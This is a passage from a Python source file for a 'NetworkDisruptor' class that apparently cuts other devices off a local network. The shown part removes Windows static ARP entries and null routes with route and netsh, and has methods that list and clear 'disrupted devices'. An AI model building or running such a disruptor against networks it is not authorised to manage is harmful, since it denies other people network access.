                    ], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        log_info(f"🔓 Removed static ARP entry for {target_ip}")
                    else:
                        log_error(f"ARP removal failed: {result.stderr}")
                except subprocess.TimeoutExpired:
                    log_error(f"ARP removal timeout for {target_ip}")
                except Exception as e:
                    log_error(f"Could not remove ARP entry: {e}")
                
                # Method 3: Remove null route
                try:
                    result = subprocess.run([
                        "route", "delete", target_ip
                    ], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        log_info(f"🔓 Removed null route for {target_ip}")
                    else:
                        log_error(f"Route removal failed: {result.stderr}")
                except subprocess.TimeoutExpired:
                    log_error(f"Route removal timeout for {target_ip}")
                except Exception as e:
                    log_error(f"Could not remove null route: {e}")
                
                # Method 4: Remove interface-level route
                try:
                    result = subprocess.run([
                        "netsh", "interface", "ipv4", "delete", "route", target_ip, "0.0.0.0", "1"
                    ], capture_output=True, text=True, timeout=5)
                    if result.returncode == 0:
                        log_info(f"🔓 Removed interface-level route for {target_ip}")
                    else:
                        log_error(f"Interface route removal failed: {result.stderr}")
                except subprocess.TimeoutExpired:
                    log_error(f"Interface route removal timeout for {target_ip}")
                except Exception as e:
                    log_error(f"Could not remove interface route: {e}")
                
                return True
            else:
                log_error("Windows aggressive blocking removal only works on Windows")
                return False
                
        except Exception as e:
            log_error(f"Windows aggressive blocking removal failed for {target_ip}: {e}")
            return False
    
    def get_disrupted_devices(self) -> List[str]:
        """Get list of currently disrupted devices"""
        return list(self.blocked_devices.keys())
    
    def get_device_status(self, target_ip: str) -> Dict:
        """Get status of a specific device"""
        if target_ip in self.blocked_devices:
            return self.blocked_devices[target_ip]
        return {}
    
    def clear_all_disruptions(self) -> bool:
        """Clear all enterprise device disruptions"""
        try:
            disrupted_ips = list(self.blocked_devices.keys())
            for ip in disrupted_ips:
                self.reconnect_device(ip)
            
            self.is_running = False
            return True
            
        except Exception as e:
            log_error(f"Error clearing all enterprise disruptions: {e}")
            return False
    
    def start(self):
        """Start the enterprise network disruptor"""
        self.is_running = True
        self.stop_event.clear()
        log_info("🚀 Enterprise Network Disruptor started")
    
    def stop(self):
        """Stop the enterprise network disruptor"""
        self.is_running = False
        self.stop_event.set()
        self.clear_all_disruptions()
        log_info("🛑 Enterprise Network Disruptor stopped")

# Global enterprise instance
network_disruptor = NetworkDisruptor() 